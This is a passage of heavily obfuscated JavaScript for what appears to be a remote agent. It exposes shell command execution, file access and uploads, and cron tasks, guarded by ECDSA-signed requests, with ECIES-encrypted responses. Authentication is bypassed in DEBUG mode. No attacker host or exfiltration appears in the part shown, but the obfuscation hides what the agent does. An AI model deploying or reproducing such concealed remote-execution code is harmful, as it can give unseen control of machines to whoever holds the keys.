        'swvysvu',
        'vMDICgu',
        'BMv0D29YAW',
        'r2TgAuu',
        'wMHhshy',
        'x2DLDenVBMzPz1zHBhvL',
        'wuzzsxG',
        'q29UzMLNihzHBgLKyxrLza',
        'AwyTBM9Uzs1TyxrJAa',
        'vNvqq1O',
        'Bwv0Ag9K',
        'y2f0y2G',
        'AxnbCNjHEq',
        'zgvJCNLWDa',
        'Ec1HzxmTzw5JCNLWDgvK',
        'x2nOzwnRqwnJzxnZ',
        'Ec1LBMnYExb0zwq',
        'wM50vK8',
        'DxbSB2fKrMLSzq',
        'vMXSq2S',
        'CgPIrKq',
        'BvjkyvC',
        'zMLSDgvY',
        'zgLZAW',
        'zNjVBuj5DgvZ',
        'sevbra',
        'Dgv4Dc9WBgfPBG',
        'ufvu',
        'BfPvAvC',
        'zMHfBM0',
        'x2rVBwfPBG',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'DgHLBG',
        'Bw9Kzq',
        'wf9psW',
        'y29UDgvUDc1SB2nHDgLVBG',
        'qNjxAg4',
        'r01Qwuq',
        'r2HzB0i',
        'C2v0vty0',
        'EKTAvum',
        'zMLUAxnO',
        'sfz0uu0',
        'AxDKr3e',
        'z0Pcwxm',
        'D3vzEvy',
        'C3rHDgLJ',
        'qwnJzxnZlunVBNrYB2WTrxHWB3nLluHLywrLCNm',
        'CMvMCMvZAa',
        'CM1tEw5J',
        'ANfgufe',
        's2DJwNK',
        't1vmrKK',
        'C29YDa',
        'Ec1JAhvUAY1Pza',
        'wvDlsLa',
        'yxjNBYb0Dw5UzwWGy3jLyxrLzdOG',
        'lcbtAwDUywW6ia',
        'Ec10B3rHBc1JAhvUA3m',
        'zvDrqxm',
        'Bgf0Aw4X',
        'DxbKyxrLq29UzMLN',
        'DNvnueq',
        'dqPdB250zw50lurPC3bVC2L0Aw9UoIbMB3jTlwrHDge7ig5HBwu9iG',
        'B2vxD1a',
        'B3DUzxi',
        '8j+uKcdMO4dMTyVLIlaGvg9Rzw7VViZOP4BKUlOGv1ntioMtVUI3R++8JoI3S+I/HYboB2LZzq',
        'AxnFyxv0AgvUDgLJyxrLza',
        'v3HjrKy',
        'DxbSB2fKrMLSzvjHDW',
        'y3jVBG',
        'Aw52ywXPzcbXDwLJAYb0Dw5UzwWGCMvZCg9UC2u6ia',
        'sfruuca',
        'quzMC2u',
        'BhrMEuy',
        't3jPz2LUoIbODhrWCZOVlW'
    ];
    a0a = function () {
        return fG;
    };
    return a0a();
}
function a0D() {
    const aX = a0aO;
    let a = null;
    try {
        a = a0o[aX(0x315)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[aX(0x45d)](d) && a0l[aX(0x59e)](d)['isDirectory']())
            return d;
        if (d)
            console[aX(0x6b8)](aX(0x22d) + d);
    }
    return console[aX(0x6b8)](aX(0x50b) + process[aX(0x41e)]()), process[aX(0x41e)]();
}
class a0E {
    constructor(a = 'ok') {
        const aY = a0aO;
        this[aY(0x7ac)] = a;
    }
}
class a0F extends a0E {
    constructor(a = 'ok', b = 0x0) {
        const aZ = a0aO;
        super(a), this[aZ(0x408)] = b;
    }
}
class a0G extends a0E {
    constructor() {
        const b0 = a0aO, a = { 'bHbwe': b0(0x6df) }, b = a[b0(0x1c2)][b0(0x2c2)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b0(0x4cd)] = '';
                continue;
            case '1':
                this[b0(0x4ca)] = null;
                continue;
            case '2':
                this[b0(0x2c1)] = 0x0;
                continue;
            case '3':
                this[b0(0x4ee)] = null;
                continue;
            case '4':
                this[b0(0x4ef)] = '';
                continue;
            case '5':
                this['version'] = a0N['AGENT_VERSION'];
                continue;
            case '6':
                this[b0(0x343)] = '';
                continue;
            case '7':
                this['cpu_cores'] = 0x0;
                continue;
            case '8':
                this[b0(0x48d)] = '';
                continue;
            case '9':
                this[b0(0x531)] = '';
                continue;
            case '10':
                super();
                continue;
            case '11':
                this[b0(0x63c)] = null;
                continue;
            case '12':
                this[b0(0x785)] = 0x0;
                continue;
            case '13':
                this[b0(0x142)] = 0x0;
                continue;
            case '14':
                this['os'] = '';
                continue;
            case '15':
                this[b0(0x2d1)] = '';
                continue;
            }
            break;
        }
    }
}
class a0H extends a0E {
    constructor() {
        const b1 = a0aO;
        super(), this[b1(0x412)] = { 'usage': 0x0 }, this[b1(0x5a2)] = {
            'total': 0x0,
            'used': 0x0
        }, this[b1(0x3c9)] = {
            'total': 0x0,
            'used': 0x0
        }, this[b1(0x382)] = {
            'load1': 0x0,
            'load5': 0x0,
            'load15': 0x0
        }, this[b1(0x654)] = {
            'total': 0x0,
            'used': 0x0
        }, this[b1(0x63f)] = {
            'up': 0x0,
            'down': 0x0,
            'totalUp': 0x0,
            'totalDown': 0x0
        }, this['connections'] = {
            'tcp': 0x0,
            'udp': 0x0
        }, this[b1(0x6d9)] = 0x0, this[b1(0x5ed)] = 0x0, this[b1(0x6ac)] = '';
    }
}
class a0I extends a0E {
    constructor() {
        const b2 = a0aO, a = b2(0x226)[b2(0x2c2)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                super();
                continue;
            case '1':
                this[b2(0x58a)] = '';
                continue;
            case '2':
                this[b2(0x46c)] = ![];
                continue;
            case '3':
                this[b2(0x49d)] = 0x0;
                continue;
            case '4':
                this[b2(0x57c)] = '';
                continue;
            }
            break;
        }
    }
}
class a0J {
    constructor() {
        const b3 = a0aO, a = b3(0x287)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[b3(0x201)] = '';
                continue;
            case '1':
                this[b3(0x738)] = '';
                continue;
            case '2':
                this[b3(0x14f)] = '';
                continue;
            case '3':
                this[b3(0x67e)] = '';
                continue;
            case '4':
                this['name'] = '';
                continue;
            case '5':
                this[b3(0x65e)] = '';
                continue;
            case '6':
                this['type'] = '';
                continue;
            case '7':
                this[b3(0x2ea)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0K {
    constructor() {
        const b4 = a0aO, a = b4(0x1b2)[b4(0x2c2)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[b4(0x760)] = ![];
                continue;
            case '1':
                this[b4(0x738)] = '';
                continue;
            case '2':
                this['mode'] = '';
                continue;
            case '3':
                this[b4(0x201)] = '';
                continue;
            case '4':
                this[b4(0x1a9)] = '';
                continue;
            case '5':
                this[b4(0x1bd)] = '';
                continue;
            case '6':
                this[b4(0x776)] = ![];
                continue;
            case '7':
                this[b4(0x3fc)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0L extends a0E {
    constructor() {
        const b5 = a0aO;
        super(), this[b5(0x732)] = [];
    }
}
class a0M {
    static [a0aO(0x3d2)]() {
        const b6 = a0aO, a = {
                'BUNjD': b6(0x79e),
                'rDeSU': b6(0x32b),
                'UCoUk': b6(0x396),
                'ZhGHv': function (i, j) {
                    return i !== j;
                },
                'NZGiU': b6(0x3a2)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[b6(0x629)](a[b6(0x5a6)]), d = b[b6(0x1d2)]({ 'format': a[b6(0x30f)] }), f = c['export']({ 'format': a['rDeSU'] }), g = Buffer[b6(0x426)](d['d'], a[b6(0x43c)]), h = Buffer[b6(0x426)](f['x'], a[b6(0x43c)]);
        return (a['ZhGHv'](g[b6(0x261)], 0x20) || a[b6(0x641)](h['length'], 0x20)) && a0B[b6(0x49c)](b6(0x1a5)), {
            'private_b64': g['toString'](a[b6(0x33b)]),
            'public_b64': h[b6(0x3e1)]('base64')
        };
    }
    static [a0aO(0x5f8)](a) {
        const b7 = a0aO, b = this[b7(0x3d2)]();
        return {
            'role': a,
            'private_b64': b[b7(0x2e0)],
            'public_b64': b[b7(0x5e1)]
        };
    }
    static [a0aO(0x500)](a = a0aO(0x6e5), b = a0aO(0x3b8)) {
        const b8 = a0aO, c = {
                'control': this[b8(0x5f8)](a),
                'agent': this[b8(0x5f8)](b)
            };
        return c;
    }
}
class a0N {
    static [a0aO(0x742)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aO(0x369)] = (process.env.EXEC_SHELL || a0aO(0x269))[a0aO(0x441)]() === a0aO(0x269);
    static [a0aO(0x145)] = (process.env.DEBUG || a0aO(0x27a))[a0aO(0x441)]() === a0aO(0x269);
    static [a0aO(0x6b7)] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static [a0aO(0x615)] = parseInt(process.env.LOG_LEVEL || (this[a0aO(0x145)] ? '0' : '2'), 0xa);
    static [a0aO(0x255)] = a0N[a0aO(0x642)](a0aO(0x298), 'keys/agent_ecdsa_pub.pem') || 'ECDSA公钥内容';
    static [a0aO(0x6ea)] = a0N[a0aO(0x642)](a0aO(0x28a), a0aO(0x360)) || 'ECIES公钥内容';
    static [a0aO(0x388)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aO(0x559)] = parseInt(process.env.TEMPKEY_MAX_TTL || '168', 0xa);
    static [a0aO(0x212)] = a0D();
    static [a0aO(0x239)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aO(0x7ad));
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0aO(0x27a))[a0aO(0x441)]() === a0aO(0x269);
    static ['FILE_AUDIT_LOG'] = (process.env.FILE_AUDIT_LOG || a0aO(0x269))['toLowerCase']() === a0aO(0x269);
    static ['InitTask'] = !![];
    static [a0aO(0x72b)] = [];
    static ['crontasks'] = {};
    static [a0aO(0x2b5)] = ![];
    static [a0aO(0x62a)] = parseInt(process.env.TASK_TIMEOUT || a0aO(0x54a));
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aO(0x5d8)] = [];
    static [a0aO(0x349)] = [];
    static [a0aO(0x1b6)] = parseInt(process.env.MAX_TASK_LOG || a0aO(0x4a5));
    static ['HOST'] = process.env.HOST || '0.0.0.0';
    static [a0aO(0x1ed)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aO(0x3bb));
    static [a0aO(0x2d4)] = (process.env.KMODE || '0')[a0aO(0x61c)]() || '0';
    static [a0aO(0x177)] = (process.env.KNAME || '')[a0aO(0x61c)]();
    static ['KNAME_KEY'] = (process.env.KNAME_KEY || '')[a0aO(0x61c)]();
    static ['KPATH'] = process.env.KPATH || '';
    static [a0aO(0x739)] = process.env.AGENT_VERSION || a0aO(0x1ad);
    static ['SESSION_KEY'] = a0k[a0aO(0x391)](0x20)[a0aO(0x3e1)](a0aO(0x3a2));
    static ['NOISE_KEYS_INTERNAL'] = a0M['generatePair']();
    static [a0aO(0x4a9)]() {
        const b9 = a0aO, a = {
                'ESPPW': b9(0x352),
                'pzMAD': b9(0x620),
                'pqQMf': 'base64'
            };
        return a0k[b9(0x50e)](a['ESPPW'], Buffer['from'](this[b9(0x578)], b9(0x3a2)))[b9(0x708)](a[b9(0x469)])[b9(0x1fe)](a['pqQMf']);
    }
    static [a0aO(0x215)]() {
        const ba = a0aO, a = {
                'BYpFa': ba(0x3a2),
                'pMtSx': ba(0x703)
            }, b = a0M[ba(0x500)]();
        this[ba(0x26a)][ba(0x285)] = b[ba(0x285)], this[ba(0x6aa)][ba(0x193)][ba(0x2d9)] = b['control'][ba(0x2e0)], this[ba(0x578)] = a0k[ba(0x391)](0x20)[ba(0x3e1)](a[ba(0x37b)]), this[ba(0x205)] = null, this[ba(0x2be)] = 0x0, this[ba(0x45f)] = null, this[ba(0x4af)] = 0x0, a0B[ba(0x3b0)](a[ba(0x789)]);
    }
    static [a0aO(0x6aa)] = {
        'controller': { 'private': this[a0aO(0x26a)]['control'][a0aO(0x2e0)] },
        'agent': { 'public': this[a0aO(0x26a)][a0aO(0x35f)][a0aO(0x5e1)] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static ['STATUS_CACHE_TTL'] = 0x1e;
    static [a0aO(0x205)] = null;
    static [a0aO(0x2be)] = 0x0;
    static ['_baseinfo_fetch_promise'] = null;
    static ['_status_cache'] = null;
    static [a0aO(0x4af)] = 0x0;
    static [a0aO(0x780)] = null;
    static [a0aO(0x642)](a, b) {
        const bb = a0aO, c = process.env[a];
        if (c)
            return c;
        const d = a0n[bb(0x4d0)](__dirname, b);
        if (a0l[bb(0x45d)](d))
            try {
                return a0l[bb(0x73d)](d, bb(0x58c))['trim']();
            } catch (f) {
            }
        return '';
    }
    static [a0aO(0x5ee)]() {
        const bc = a0aO, a = {
                'JFHUO': bc(0x42e),
                'kBdWl': bc(0x65c),
                'IoAig': function (b, c) {
                    return b > c;
                },
                'iOCLE': bc(0x535),
                'MbzzV': bc(0x5f9),
                'lcRGY': '\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)'
            };
        if (!this[bc(0x145)]) {
            const b = [];
            !this[bc(0x255)] && b[bc(0x51c)](a[bc(0x307)]);
            !this[bc(0x6ea)] && b['push'](a['kBdWl']);
            if (a[bc(0x509)](b['length'], 0x0)) {
                const c = a[bc(0x7b5)][bc(0x2c2)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0B[bc(0x637)](a['MbzzV']);
                        continue;
                    case '1':
                        a0B[bc(0x49c)]('❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):');
                        continue;
                    case '2':
                        a0B['debug'](a[bc(0x235)]);
                        continue;
                    case '3':
                        a0B['debug'](bc(0x561));
                        continue;
                    case '4':
                        process[bc(0x3cd)](0x1);
                        continue;
                    case '5':
                        b[bc(0x184)](f => a0B['error'](bc(0x3a7) + f));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aO(0x39b)](a = {}) {
        const bd = a0aO, b = {
                'MLcVB': function (c, d, f) {
                    return c(d, f);
                },
                'lxjNt': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a[bd(0x1ed)] !== undefined && a[bd(0x1ed)] !== null && (this[bd(0x1ed)] = b[bd(0x25c)](parseInt, b[bd(0x709)](String, a['PORT']), 0xa)), a[bd(0x255)] && (this[bd(0x255)] = a[bd(0x255)][bd(0x61c)]()), a[bd(0x6ea)] && (this[bd(0x6ea)] = a['ECIES_PUBLIC_KEY_PEM']['trim']());
    }
}
class a0O {
    constructor() {
        const be = a0aO;
        this['_key'] = null, this[be(0x3da)] = null;
    }
    [a0aO(0x6f8)](a) {
        const bf = a0aO, b = { 'YDHXb': bf(0x19e) }, c = b[bf(0x503)][bf(0x2c2)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                if (this[bf(0x293)])
                    return this[bf(0x293)];
                continue;
            case '1':
                return this[bf(0x293)];
            case '2':
                this['_key'] = this[bf(0x454)](a);
                continue;
            case '3':
                a0B['info'](bf(0x613) + this[bf(0x293)]['key_id'] + ',\x20有效期\x20' + a + bf(0x466));
                continue;
            case '4':
                this['_expireCurrent']();
                continue;
            }
            break;
        }
    }
    [a0aO(0x3c0)]() {
        const bg = a0aO;
        this[bg(0x6eb)]();
        if (this['_key'])
            return this['_key'][bg(0x39d)];
        return null;
    }
    [a0aO(0x292)]() {
        const bh = a0aO;
        this[bh(0x6eb)]();
        if (this['_key'])
            return this['_key'][bh(0x721)];
        return null;
    }
    ['_expireCurrent']() {
        const bi = a0aO, a = {
                'qmirX': function (b, c) {
                    return b === c;
                }
            };
        if (this[bi(0x293)] && this[bi(0x183)](this[bi(0x293)])) {
            const b = this[bi(0x293)][bi(0x1b9)];
            this[bi(0x293)] = null, a0B[bi(0x3b0)](bi(0x5ea) + b);
            if (a[bi(0x1d1)](typeof this[bi(0x3da)], bi(0x253)))
                try {
                    this[bi(0x3da)]();
                } catch (c) {
                    a0B[bi(0x49c)](bi(0x452) + c[bi(0x6ac)]);
                }
        }
    }
    [a0aO(0x183)](a) {
        const bj = a0aO, b = {
                'nbDxS': function (c, d) {
                    return c >= d;
                }
            };
        return b[bj(0x257)](Math['floor'](Date['now']() / 0x3e8), a['expires_at']);
    }
    [a0aO(0x454)](a) {
        const bk = a0aO, b = {
                'iWXdy': bk(0x59a),
                'FcIiW': bk(0x4c6),
                'oiTQM': function (l, m) {
                    return l + m;
                },
                'dpidd': bk(0x1ac)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bk(0x629)]('ec', { 'namedCurve': 'prime256v1' }), f = c['export']({
                'type': bk(0x28f),
                'format': 'pem'
            }), g = d[bk(0x1d2)]({
                'type': b['iWXdy'],
                'format': b[bk(0x404)]
            }), h = a0k[bk(0x391)](0x20), i = Buffer['from'](a0z[bk(0x631)](h, ![])), j = Math[bk(0x6fd)](Date[bk(0x1e4)]() / 0x3e8), k = a * 0xe10;
        return {
            'key_id': a0k['randomBytes'](0x8)[bk(0x3e1)](bk(0x1ac)),
            'created_at': j,
            'expires_at': b['oiTQM'](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bk(0x3e1)](b['dpidd']),
            'ecies_public_key': i[bk(0x3e1)](b[bk(0x336)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0P {
    constructor(a, b) {
        const bl = a0aO, c = {
                'vQgjX': '-----BEGIN',
                'GaAcK': bl(0x3a2),
                'IIYYB': function (d, f) {
                    return d(f);
                },
                'YFYIx': function (d, f) {
                    return d(f);
                },
                'Auwxm': bl(0x32b)
            };
        this[bl(0x70b)] = null, this[bl(0x472)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d['startsWith'](c[bl(0x564)]))
                    this['ecdsaPubkey'] = a0k[bl(0x18a)](d);
                else {
                    const f = Buffer[bl(0x426)](d, c[bl(0x185)]), g = a0y[bl(0x759)][bl(0x655)](f), h = g['toBytes'](![]), i = m => m[bl(0x3e1)](bl(0x3a2))[bl(0x479)](/\+/g, '-')[bl(0x479)](/\//g, '_')[bl(0x479)](/=/g, ''), j = c['IIYYB'](i, Buffer[bl(0x426)](h[bl(0x71b)](0x1, 0x21))), k = c[bl(0x643)](i, Buffer[bl(0x426)](h[bl(0x71b)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': bl(0x2cc),
                            'x': j,
                            'y': k
                        };
                    this[bl(0x70b)] = a0k['createPublicKey']({
                        'key': l,
                        'format': c[bl(0x2dc)]
                    });
                }
            } catch (m) {
                a0B['error'](bl(0x795) + m[bl(0x6ac)]), this[bl(0x70b)] = null;
            }
        if (b)
            try {
                this[bl(0x472)] = a0v[bl(0x506)](b[bl(0x61c)]());
            } catch (n) {
                a0B[bl(0x3b0)](bl(0x45e) + n[bl(0x6ac)]);
            }
    }
    [a0aO(0x27e)](a, b, c, d, f, g, h = null) {
        const bm = a0aO, i = {
                'YCCQg': bm(0x4f7),
                'oEAvT': function (j, k) {
                    return j > k;
                },
                'HAQUs': function (j, k) {
                    return j - k;
                },
                'OfSJU': function (j, k) {
                    return j - k;
                },
                'mzVEq': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'iTjpn': bm(0x66b),
                'WnqMz': bm(0x2e4),
                'Qatmw': bm(0x171)
            };
        if (!this[bm(0x70b)])
            throw new Error(i['YCCQg']);
        try {
            const j = parseInt(f), k = Math[bm(0x6fd)](Date[bm(0x1e4)]() / 0x3e8);
            if (i[bm(0x33a)](Math[bm(0x414)](i[bm(0x348)](k, j)), a0N[bm(0x6b7)]))
                throw new Error(bm(0x4db) + Math[bm(0x414)](i[bm(0x156)](k, j)) + bm(0x3f6) + a0N[bm(0x6b7)] + 's');
            const l = i[bm(0x4ea)](a0Q, a, b, c, d, f);
            if (this['_verifyWith'](this[bm(0x70b)], l, g))
                return i[bm(0x5dd)];
            if (h && this['_verifyWith'](h, l, g))
                return i[bm(0x6e6)];
            throw new Error(i[bm(0x1fb)]);
        } catch (m) {
            throw new Error('Signature\x20verification\x20failed:\x20' + m[bm(0x6ac)]);
        }
    }
    [a0aO(0x792)](a, b, c) {
        const bn = a0aO;
        if (!a)
            return ![];
        try {
            const d = a0v[bn(0x506)](c), f = a0k['createVerify'](bn(0x491));
            return f[bn(0x708)](b), f[bn(0x358)](a, d);
        } catch (g) {
            return ![];
        }
    }
    [a0aO(0x23e)](a, b = null) {
        const bo = a0aO, c = {
                'XsWtE': bo(0x62c),
                'hpTbh': function (d, f, g) {
                    return d(f, g);
                },
                'mkwlX': bo(0x3a2)
            };
        if (a0N['DEBUG'] || !this[bo(0x472)])
            return JSON[bo(0x698)](a);
        try {
            const d = JSON[bo(0x698)](a), f = Buffer['from'](d, c[bo(0x176)]), g = b || Buffer[bo(0x426)](this[bo(0x472)]), h = c[bo(0x1d7)](a0u, g, f);
            return Buffer[bo(0x426)](h)['toString'](c['mkwlX']);
        } catch (i) {
            const j = {
                '_encrypt_error': i[bo(0x6ac)],
                '_raw': a0N[bo(0x145)] ? a : null
            };
            return JSON[bo(0x698)](j);
        }
    }
    [a0aO(0x160)](a, b) {
        const bp = a0aO, c = {
                'tzvBI': function (d, f) {
                    return d !== f;
                },
                'vuMPD': bp(0x366),
                'yuAss': bp(0x3a2),
                'odbRy': bp(0x35b),
                'wUXuT': bp(0x222)
            };
        if (!b || c['tzvBI'](b[bp(0x261)], 0x20))
            throw new Error(c[bp(0x67b)]);
        try {
            const d = Buffer[bp(0x426)](a, c[bp(0x20c)])['toString'](bp(0x58c)), f = JSON['parse'](d);
            if (!f['nonce'] || !f[bp(0x6ba)] || !f[bp(0x359)])
                throw new Error(c[bp(0x29b)]);
            const g = Buffer['from'](f['nonce'], c[bp(0x20c)]), h = Buffer['from'](f[bp(0x6ba)], c[bp(0x20c)]), i = Buffer['from'](f[bp(0x359)], c[bp(0x20c)]), j = a0k[bp(0x266)](c[bp(0x6e0)], b, g);
            j[bp(0x41b)](h);
            let k = j['update'](i, null, bp(0x58c));
            return k += j['final']('utf8'), k;
        } catch (l) {
            throw new Error(bp(0x5cc) + l['message']);
        }
    }
}
function a0Q(a, b, c, d, f) {
    const bq = a0aO, g = { 'mEITB': bq(0x352) };
    return !c && (c = a0k['createHash'](g['mEITB'])[bq(0x708)](Buffer[bq(0x53d)](0x0))[bq(0x1fe)](bq(0x1ac))), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0R(a, b = null) {
    const br = a0aO, c = {
            'RzwnH': 'Content-Type',
            'HzfXe': br(0x69d),
            'CTWwR': function (d, f) {
                return d === f;
            },
            'bgImX': br(0x2e4),
            'qoYHt': 'true',
            'qycuX': br(0x58c),
            'IcvhG': function (d, f) {
                return d === f;
            },
            'GatTt': br(0x64d),
            'zszvc': br(0x27a),
            'sDMdz': br(0x5d2),
            'jauEQ': br(0x740),
            'oeNQb': function (d) {
                return d();
            },
            'UHwSL': br(0x144),
            'gpiQE': function (d, f) {
                return d === f;
            },
            'jMrhV': function (d) {
                return d();
            },
            'bHOKE': br(0x62f),
            'XxgxB': function (d) {
                return d();
            },
            'RCzyJ': br(0x783),
            'yubDX': br(0x3ee),
            'pZpok': 'x-auth-token',
            'wCbOt': 'X-Auth-Token',
            'VvyXN': function (d, f) {
                return d || f;
            },
            'vGZMI': function (d) {
                return d();
            },
            'IZFZr': 'Missing\x20auth\x20headers',
            'uIGJk': br(0x62c),
            'mcmZN': function (d, f) {
                return d > f;
            },
            'uDLyA': br(0x352),
            'ktKJC': br(0x1ac),
            'tbzAS': function (d, f) {
                return d === f;
            },
            'vTUyU': br(0x66b),
            'ysdce': function (d) {
                return d();
            },
            'AilaM': function (d, f) {
                return d === f;
            },
            'UVhiY': br(0x64b),
            'umAgh': br(0x3a2),
            'ONNdu': br(0x296),
            'zUbGR': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bs = br, h = {
                'lNEFJ': c['RzwnH'],
                'UxEXl': bs(0x590),
                'LUpRF': function (n, o) {
                    return n === o;
                },
                'UhCCi': c[bs(0x435)],
                'JorMO': function (n, o) {
                    const bt = bs;
                    return c[bt(0x420)](n, o);
                },
                'JshwH': c['bgImX'],
                'dNllp': c[bs(0x4a2)],
                'uJIzl': c[bs(0x79d)],
                'amdlg': function (n, o) {
                    return c['IcvhG'](n, o);
                },
                'TBhqk': c[bs(0x596)],
                'bVWAR': c['zszvc'],
                'NRsez': c[bs(0x281)]
            };
        if (d[bs(0x738)]['startsWith'](c[bs(0x5d4)]))
            return c[bs(0x5a7)](g);
        if (d['method'] === c[bs(0x40c)] || c['gpiQE'](d[bs(0x647)], bs(0x656)))
            return c['jMrhV'](g);
        d[bs(0x680)] = ![];
        const i = [
            '/api/baseinfo',
            c[bs(0x386)]
        ];
        if (a0N[bs(0x145)])
            return d[bs(0x680)] = !![], c[bs(0x5f5)](g);
        const j = d['headers'][bs(0x638)] || d[bs(0x71c)][c['RCzyJ']], k = d['headers'][c[bs(0x7b4)]] || d[bs(0x71c)]['X-Timestamp'], l = d['headers'][c[bs(0x218)]] || d[bs(0x71c)][c[bs(0x4bb)]];
        if (c[bs(0x46b)](!j, !k) || !l)
            return i[bs(0x47a)](d[bs(0x738)]) ? c['vGZMI'](g) : f[bs(0x7ac)](0x191)[bs(0x182)]({ 'error': c[bs(0x6de)] });
        try {
            let n = Buffer[bs(0x53d)](0x0);
            if (d[bs(0x738)] !== bs(0x545)) {
                if (Buffer[bs(0x797)](d[bs(0x19b)]))
                    n = d[bs(0x19b)];
                else {
                    if (c[bs(0x2aa)](typeof d[bs(0x19b)], c[bs(0x435)]))
                        n = Buffer['from'](d['body'], c['uIGJk']);
                }
            }
            const o = c[bs(0x270)](n['length'], 0x0) ? a0k[bs(0x392)](c[bs(0x2d2)])[bs(0x708)](n)[bs(0x1fe)](c[bs(0x6ad)]) : '', p = b ? b[bs(0x3c0)]() : null, q = a[bs(0x27e)](d[bs(0x647)], d[bs(0x738)], o, j, k, l, p);
            d[bs(0x680)] = !![], d[bs(0x1da)] = c['tbzAS'](q, c[bs(0x16b)]) ? c['bgImX'] : c[bs(0x399)];
        } catch (r) {
            return i['includes'](d[bs(0x738)]) ? c[bs(0x538)](g) : f[bs(0x7ac)](0x191)['json']({ 'error': bs(0x625) + r[bs(0x6ac)] });
        }
        if (d[bs(0x19b)] && c[bs(0x420)](typeof d[bs(0x19b)], c[bs(0x435)])) {
            const s = c[bs(0x6cc)]((d[bs(0x71c)][c[bs(0x413)]] || '')[bs(0x441)](), c[bs(0x4a2)]);
            try {
                if (s && d[bs(0x680)]) {
                    const t = Buffer[bs(0x426)](a0N[bs(0x578)], c['umAgh']), u = a[bs(0x160)](d[bs(0x19b)], t);
                    d['body'] = JSON['parse'](u);
                } else {
                    if (d[bs(0x19b)][bs(0x2c3)](c[bs(0x186)])) {
                        const v = Buffer[bs(0x426)](d[bs(0x19b)], c[bs(0x342)])[bs(0x3e1)](bs(0x62c));
                        d['body'] = JSON[bs(0x439)](v);
                    } else {
                        if (d[bs(0x19b)]['trim']()[bs(0x2c3)]('{') || d[bs(0x19b)][bs(0x61c)]()[bs(0x2c3)]('['))
                            d[bs(0x19b)] = JSON['parse'](d[bs(0x19b)]);
                        else {
                            if (c[bs(0x56f)](d['body']['trim'](), ''))
                                d[bs(0x19b)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0B[bs(0x49c)]('💥\x20[Body\x20Parse\x20Error]:\x20' + w['message']), f[bs(0x7ac)](0x190)[bs(0x182)]({ 'error': 'Invalid\x20body\x20format:\x20' + w['message'] });
            }
        }
        const m = f[bs(0x195)];
        f[bs(0x195)] = function (x) {
            const bu = bs;
            if (f['get'](h['lNEFJ']) && f[bu(0x6f7)](h[bu(0x7b2)])[bu(0x47a)](h[bu(0x437)]))
                try {
                    const y = h['LUpRF'](typeof x, h[bu(0x587)]) ? JSON['parse'](x) : x;
                    if (d['is_authenticated']) {
                        let z = null;
                        h[bu(0x577)](d[bu(0x1da)], h[bu(0x18f)]) && b && (z = b[bu(0x292)]());
                        const A = a['encryptResponse'](y, z), B = h[bu(0x577)](typeof A, h[bu(0x587)]) ? A : JSON['stringify'](A);
                        return f[bu(0x3bc)]('x-encrypted', h['dNllp']), f[bu(0x3bc)]('x-agent-version', a0N[bu(0x739)]), f[bu(0x3bc)]('Content-Length', Buffer[bu(0x1d6)](B, h[bu(0x764)])['toString']()), m[bu(0x715)](this, B);
                    } else {
                        const C = h[bu(0x16c)](typeof x, 'string') ? x : JSON[bu(0x698)](y);
                        return f[bu(0x3bc)](h[bu(0x458)], h[bu(0x4d4)]), f[bu(0x3bc)](h[bu(0x5f3)], Buffer[bu(0x1d6)](C, h['uJIzl'])['toString']()), m['call'](this, C);
                    }
                } catch (D) {
                    if (a0N['DEBUG'])
                        a0B[bu(0x49c)](bu(0x461) + D[bu(0x6ac)]);
                }
            return m['call'](this, x);
        }, c[bs(0x516)](g);
    };
}
class a0S {
    constructor() {
        const bv = a0aO, a = {
                'GhYoB': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bv(0x51f)] = 0x0, this[bv(0x61a)] = 0x0, this[bv(0x4f8)] = a[bv(0x663)](Date[bv(0x1e4)](), 0x3e8);
    }
    async [a0aO(0x595)]() {
        const bw = a0aO, a = {
                'uNSjg': bw(0x22e),
                'zsJyL': 'utf8',
                'BYvQg': function (d, f) {
                    return d === f;
                },
                'zdjHJ': bw(0x58b),
                'VQsoU': function (d, f, g) {
                    return d(f, g);
                },
                'knzdT': function (d, f, g) {
                    return d(f, g);
                },
                'nLwnn': bw(0x48f),
